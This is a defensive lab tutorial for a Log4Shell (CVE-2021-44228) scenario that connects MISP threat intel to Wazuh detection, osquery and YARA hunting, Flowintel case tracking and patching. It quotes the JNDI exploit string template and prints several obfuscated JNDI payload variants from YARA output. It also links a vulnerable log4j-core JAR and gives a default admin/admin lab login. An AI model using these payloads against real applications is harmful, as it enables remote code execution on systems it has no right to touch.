# Log4Shell — MISP ⇄ Wazuh interoperability demo

This scenario ties together everything built in [TUTORIAL.md](TUTORIAL.md): MISP
as the intelligence source, feed/server synchronisation, the Wazuh ⇄ MISP integration, FIM
and Suricata detection, and case management. It follows a single incident end to end —
from a community advisory landing in MISP, to live detection in Wazuh, to a triage decision
and a response.

## Scenario

We run Wazuh across a fleet of hosts and subscribe to a MISP sharing community. A community
member has just published a **Log4Shell** campaign — the December 2021 remote-code-execution
vulnerability in Apache Log4j (`CVE-2021-44228`), exploited by getting a vulnerable
application to log a crafted `${jndi:...}` string that makes it fetch and execute
attacker-controlled code. Watch how that shared intel becomes **detection**, **triage**,
**risk assessment** and **mitigation** in our own environment.

## Stage 1 — Intel published on the upstream MISP

On the upstream instance, create the event (or import [Appendix A](#appendix-a) directly).
This mirrors what an analyst would build when writing up a fresh campaign: a human-readable
report plus the machine-readable indicators an automated pipeline can act on.

**Event metadata:**
* `info` — a one-line title (e.g. _"Log4Shell (CVE-2021-44228) exploitation campaign"_).
* `event report` — the narrative write-up of the campaign.
* **TLP tag** — the sharing/traffic-light-protocol classification that controls who the
  event may be distributed to (e.g. `tlp:clear`).
* **attack-pattern galaxy** — `Exploit Public-Facing Application (T1190)`, mapping the
  campaign to the MITRE ATT&CK technique so it slots into a wider threat picture.

**Attributes** (the individual IOCs — flag the actionable ones `to_ids` so Wazuh matches
against them, exactly as in the tutorial's `get_iocs.py`):
* `domain` — the attacker callback domain. Use a lab-controlled domain you can query; it does
  not need to resolve, it only needs to appear on the wire so detection can catch it.
* `ip-dst` — the callback IP the exploited host would reach out to.
* `text` — an optional attribute holding the JNDI payload string
  (e.g. `${jndi:ldap://<IP>/a}`), kept for context/readability rather than matching.

**Objects:**
* `file` — a `file` object bundling the filename (`log4j-core-2.14.1.jar`) and its **md5**
  hash for a vulnerable log4j-core JAR, so a host that downloads the exact file can be caught
  by hash.

> This is exactly the shape of a real community advisory — a CVE, a campaign, and
> machine-readable indicators (network + file) that an automated pipeline can act on without
> a human re-typing anything.

## Stage 2 — Sync into the local MISP

On the local MISP, trigger the pull from the upstream — either via a **feed** or a
**server-to-server connection** (see tutorial sections 1.4 and 1.6). The event arrives with
its attributes, objects and tags intact, so the local instance now holds the same
intelligence the community published.

* Schedule (or manually run) a **pull** from the upstream source.
* Once pulled, the `to_ids` IOCs are immediately available for Wazuh to match against — no
  further import step is needed.

> Synchronisation is what turns "someone, somewhere published intel" into "our detection
> stack knows about it". Everything downstream depends on this event being visible to the
> API user the Wazuh integration authenticates as.

## Stage 3 — Detection

With the IOCs synced in, we generate the traffic and file activity a real exploitation
attempt would produce and watch the Wazuh ⇄ MISP integration light up. Wazuh has no
signature for this campaign — MISP supplies the knowledge.

### 3.1 — Wazuh catches the network IOC

We simulate the exploited host phoning home to the callback domain/IP and confirm the
integration raises a MISP-match alert.

Terminal 1 (agent) — watch Suricata's raw DNS events so you can see the query leave the box:
```bash
tail -f -n 0 /var/log/suricata/eve.json | grep --line-buffered dns
```

Terminal 2 (agent) — query the campaign's callback domain, then hit the callback IP. We
point `dig` at an external resolver to skip the local cache and force the packet onto the
monitored interface:
```bash
# DNS lookup of the callback domain (forced onto the monitored egress interface):
dig @8.8.8.8 <CALLBACK_DOMAIN_FROM_EVENT>
# and a connection to the callback IP:
curl -m5 -k https://<CALLBACK_IP_FROM_EVENT>/ ; true
```

Wazuh Manager terminal — watch for the enriched MISP alert:
```bash
sudo tail -f /var/ossec/logs/alerts/alerts.json | grep --line-buffered -i misp
```

**Expected:** a MISP-match alert (rule `100620`/`100622` family — the domain/IP rules added
in the tutorial) referencing the matched indicator and the source MISP event's `info`.

> A synced-in indicator just caught live traffic. This is intel-driven detection — Wazuh
> didn't have a signature for this; MISP supplied the knowledge, and the integration turned
> an ordinary Suricata DNS/connection event into a high-severity IoC alert.

### 3.2 — Wazuh catches the file-hash IOC via FIM

The same integration also matches **file hashes** with no code changes, because
`custom-misp.py` reads `md5_after`/`sha1_after`/`sha256_after` from syscheck (FIM) events
and looks them up in MISP the same way it does network IOCs.

Ensure FIM hashing is enabled for a watched directory (agent `ossec.conf`, see the tutorial's
_Monitor host malicious file hashes_ section), then drop a file whose hash matches the `md5`
IOC in the event into that directory:

```bash
cd /tmp
wget https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.14.1/log4j-core-2.14.1.jar
```

On the manager, the FIM alert enriches against MISP the same way the network event did,
producing a hash-match IoC alert (rule `100623` family).

> One MISP event, two detection surfaces — **network** (Suricata) and **file** (FIM). Real
> intel carries mixed IOC types, and the pipeline handles both from a single synced event.

## Stage 4 — Triage and open a Flowintel case

Open the Wazuh alert, confirm the MISP match, and pivot to the linked event to read the
community's write-up. Now capture the investigation somewhere durable:
[Flowintel](https://github.com/flowintel/flowintel) is a collaborative case-management tool
for incident response — think of it as the ticket that tracks this incident from first alert
to closure. In this lab it runs on its own VM, reachable at `http://192.168.56.50`
(default login `admin@admin.admin` / `admin`; see [INSTALLATION.md](INSTALLATION.md) §5 if
you built the lab from scratch).

Open a Flowintel case containing:

* the **Wazuh alert** — rule id, agent, timestamp, and the matched IOC;
* the **MISP event UUID** — link the case ⇄ intel explicitly;
* the **initial scope** — which agent saw it, what indicator, which CVE;
* space for **additional findings** gathered during the investigation (Stages 5–6).

> The case references the MISP event UUID so intel and investigation stay connected — you can
> always trace a case back to its source advisory, and forward to any sightings or new IOCs
> you add later. This closes the loop: consumed intel can become produced intel.

## Stage 5 — Am I actually exploitable?

An IOC hit tells you a host *talked to* something on the callback list. It does **not** tell
you whether that host is running vulnerable software. Pivot from "we saw traffic" to "are we
actually exposed?" using Wazuh's inventory and vulnerability-detection views.

1. Go to Wazuh → _Threat Intelligence_ → _Vulnerability Detection_.
2. Query the vulnerability module for `CVE-2021-44228` across agents.
3. Search software inventory for vulnerable log4j-core versions — `2.0-beta9` through
   `2.14.1` (`2.15.0` was the first fix, with `2.16`/`2.17` following as the CVE was
   refined).

> **Inventory has a blind spot.** Wazuh's software inventory (syscollector) enumerates OS
> **packages** (dpkg/apt on Ubuntu), not loose files sitting somewhere on disk. A `.jar`
> dropped into a `lib/` folder — exactly how Log4j usually ships, bundled inside an
> application — is not a package, so it will **never** appear in the inventory list. This is
> why Stage 6's file hunt exists.

To know whether we are vulnerable — or have been exploited — we need to separate the hosts
that are genuinely **exposed** from the hosts that merely **saw the callback**.

> An IOC hit is a signal, not a verdict. This fleet check is what converts an alert into a
> risk assessment.

## Stage 6 — Detection content + fleet hunt

Because inventory can't see bundled JARs, hunt for the vulnerable component directly across
the fleet, and add exploitation-detection content that catches the attack in logs.

### Osquery — find the vulnerable JAR on disk

[osquery](https://osquery.io) exposes the OS as SQL tables, so you can ask "where does this
file exist?" across many hosts. Wazuh integrates osquery via its osquery module — but note
Wazuh's model is **config-driven** (scheduled queries / packs deployed to agents), not
ad-hoc fleet dispatch. 

For a live demo we run it directly with `osqueryi` on an agent to illustrate the logic, in production we would have a osquery server as an entrypoint for querying all our fleet.

```sql
SELECT path, filename, size
FROM file
WHERE path LIKE '/opt/%%/log4j-core-%.jar'
   OR path LIKE '/usr/%%/log4j-core-%.jar'
   OR path LIKE '/usr/%%/bin/log4j-core-%.jar'
   OR path LIKE '/home/%%/log4j-core-%.jar';
```

Sample output:
```bash
osquery> SELECT path, filename, size
    ...> FROM file
    ...> WHERE path LIKE '/opt/%%/log4j-core-%.jar'
    ...>    OR path LIKE '/usr/%%/log4j-core-%.jar'
    ...>    OR path LIKE '/usr/%%/bin/log4j-core-%.jar'
    ...>    OR path LIKE '/home/%%/log4j-core-%.jar';
+--------------------------------------+-----------------------+---------+
| path                                 | filename              | size    |
+--------------------------------------+-----------------------+---------+
| /usr/local/bin/log4j-core-2.14.1.jar | log4j-core-2.14.1.jar | 1745700 |
+--------------------------------------+-----------------------+---------+
```

### YARA — detect exploitation attempts in logs

[YARA](https://virustotal.github.io/yara/) matches content against pattern rules — here we
use it to spot the tell-tale `${jndi:...}` payload (including its many obfuscated variants)
in a web server's access log, evidence that someone actually *tried* the exploit against us.

Pull a Log4Shell/JNDI rule from [Rulezet.org](https://rulezet.org/) (search the repo for
`log4j` / `CVE-2021-44228`), for example:
* https://rulezet.org/rule/detail_rule/233152

Run the rule against a log file (`-s` prints the matched strings):
```bash
$ yara -s log4shell.yar /var/log/apache2/access.log
EXPL_Log4j_CVE_2021_44228_Dec21_OBFUSC /var/log/apache2/access.log
0x4c:$x1: $%7Bjndi:
0xaa:$x2: %2524%257Bjndi
0x132:$x3: %2F%252524%25257Bjndi%3A
0x1c5:$x4: ${jndi:${lower:
0x241:$x5: ${::-j}${
0x2cd:$x6: ${${env:BARFOO:-j}
0x348:$x7: ${::-l}${::-d}${::-a}${::-p}
0x3cd:$x8: ${base64:JHtqbmRp
```

Each match line shows the offset and the specific obfuscation variant found — the long list
of `$x*` patterns is exactly why a hand-written grep misses real attacks and a maintained
YARA rule doesn't.

> The alert told us someone probed our infrastructure; inventory told us who is exposed; the
> hunt tells you **where the vulnerable component actually lives** — including hosts that
> never generated an alert. Three complementary views of the same incident.

More info:
* https://yara.readthedocs.io/en/stable/gettingstarted.html
* https://documentation.wazuh.com/current/proof-of-concept-guide/detect-malware-yara-integration.html

## Stage 7 — Response

Based on the exposure picture from Stages 5–6, the analyst now **decides and acts**:

* **Contain** — isolate the exposed host (Wazuh
  [Active Response](https://documentation.wazuh.com/current/user-manual/capabilities/active-response/index.html),
  or a documented manual step).
* **Mitigate** — patch log4j-core to `2.17.1`, or apply an interim measure (remove the
  `JndiLookup` class / set the documented mitigation flag) where an immediate patch isn't
  possible.
* **Record** — update the Flowintel case: status, actions taken, owner, and any new IOCs
  observed (which can be fed back into MISP).

> Detection without a decision is not enough. Ending on an action — contain, mitigate,
> document — is what makes this incident response rather than tool usage.

## Learn more about the vulnerability

To decide whether a host is actually at risk (Stage 5) you need to know *which
configurations are vulnerable*, not just that "Log4j is installed". CIRCL's
[Vulnerability-Lookup](https://vulnerability.circl.lu) aggregates the CVE record with the
enrichment that matters for triage — affected version ranges, exploitation status and
severity — in one place:

* **CVE-2021-44228 on Vulnerability-Lookup:**
  https://vulnerability.circl.lu/vuln/CVE-2021-44228

What to read there, and why it matters for this scenario:

* **Vulnerable configurations (CPE).** The affected products/versions are Apache Log4j2
  **`2.0-beta9` through `2.15.0`**. Crucially, `2.15.0` only *disabled* the JNDI lookup by
  default — the code was fully removed in `2.16.0`, and back-ported fixes shipped as
  `2.12.2`, `2.12.3` and `2.3.1` for older branches. So "we're on 2.15" is **not** a clean
  bill of health; match the exact CPE ranges against your inventory and osquery findings.
* **Conditions for exploitation.** The flaw only bites when **JNDI message-lookup
  substitution is enabled** and an attacker can influence a logged string — which is why the
  network callback (Stage 3) and the log-based YARA hunt (Stage 6) are the real evidence of
  an attempt, not the mere presence of the JAR.
* **Severity — CVSS 10.0 (Critical).** Network attack vector, low complexity, no
  authentication. This is the "patch now" tier.
* **Exploitation status.** Listed in **CISA's Known Exploited Vulnerabilities (KEV)** catalog
  (added 2021-12-10) with confirmed ransomware use, and an **EPSS ≈ 0.99999** (top-percentile
  likelihood of exploitation). For prioritisation, treat any exposed host as actively
  targeted.
* **Weakness types (CWE).** CWE-502 (Deserialization of Untrusted Data), CWE-400
  (Uncontrolled Resource Consumption) and CWE-20 (Improper Input Validation).

> This is the same enrichment MISP can pull in automatically: the `vulnerability` attribute
> in the Stage 1 event (`CVE-2021-44228`) can be expanded against Vulnerability-Lookup so the
> CVSS, KEV and EPSS context travels *with* the intel — turning "here's an IOC" into "here's
> why it's urgent".

## Appendix A

Sample Log4Shell MISP event (import this to skip building it by hand in Stage 1):

* [log4j_cve-CVE-2021-44228-event.json](misp/log4j_cve-CVE-2021-44228-event.json)

## Appendix B

Vulnerable Log4j JAR used for the file-hash / osquery detection:

* https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.14.1/log4j-core-2.14.1.jar
